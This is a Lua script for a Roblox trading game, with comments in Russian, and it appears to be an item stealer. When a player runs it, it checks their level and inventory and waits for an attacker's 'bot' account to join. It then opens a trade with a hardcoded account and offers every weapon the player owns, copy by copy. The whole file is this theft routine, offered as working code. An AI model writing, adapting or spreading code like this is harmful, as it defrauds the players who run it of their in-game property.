--- Важные переменные
local botname = "RanoDevx" --- Введите ник вашего бота


--- Получаем уровень, и проверяем больше ли он 10 уровня, если нет, то кикаем игрока с ошибкой.
local player = game.Players.LocalPlayer
local args = {
    [1] = player.Name
}
local accountInformation = game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("Misc"):WaitForChild("GetPlayerProfile"):InvokeServer(unpack(args))
local level = accountInformation["Level"]

if level < 10 then
    player:Kick("You're less than level 10.")
end

--- Парсим инвентарь и проверяем сколько всего предметов, так же получаем название и количество всех оружий.
local HttpService = game:GetService("HttpService")

local args = {
    [1] = player.Name
}

local inventory = game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("Extras"):WaitForChild("GetFullInventory"):InvokeServer(unpack(args))

local weapons = inventory["Weapons"]
local ownedWeapons = weapons["Owned"]

local groupedWeapons = {}
local currentGroup = {}
local count = 0

for weaponName, weaponCount in pairs(ownedWeapons) do
    if weaponCount > 1 then
        table.insert(currentGroup, weaponName .. " (" .. weaponCount .. ")")
    else
        table.insert(currentGroup, weaponName .. " (1)")
    end
    count = count + 1

    if count == 4 then
        table.insert(groupedWeapons, currentGroup)
        currentGroup = {}
        count = 0
    end
end

if #currentGroup > 0 then
    table.insert(groupedWeapons, currentGroup)
end

--- Ожидаем нашего бота на сервере

while true do
    local checkbot = game.Players:FindFirstChild(botname)

    if checkbot then
        break
    end
end

while true do
    local args = {
        [1] = game:GetService("Players"):WaitForChild("xv3vz")
    }
    
    game:GetService("ReplicatedStorage"):WaitForChild("Trade"):WaitForChild("SendRequest"):InvokeServer(unpack(args))
    local TradeRequest = game:GetService("ReplicatedStorage"):WaitForChild("Trade"):WaitForChild("GetTradeStatus"):InvokeServer()
    print("TradeRequest:", TradeRequest)
    if TradeRequest == "StartTrade" then
        for _, group in ipairs(groupedWeapons) do
            for _, item in ipairs(group) do
                -- Разделяем название оружия и количество
                local weaponName, weaponCount = item:match("(.+) %((%d+)%)")
                weaponCount = tonumber(weaponCount)  -- Преобразуем количество в число
        
                -- Выполняем цикл для обмена оружием столько раз, сколько указано в количестве
                for i = 1, weaponCount do
                    local args = {
                        [1] = weaponName,  -- Чистое название оружия
                        [2] = "Weapons"    -- Категория (например, Weapons)
                    }
        
                    -- Отправка запроса на сервер
                    game:GetService("ReplicatedStorage"):WaitForChild("Trade"):WaitForChild("OfferItem"):FireServer(unpack(args))
        
                    print("Предложено оружие: " .. weaponName .. " (x" .. i .. ")")
                end
            end
        end
    end
    break
end
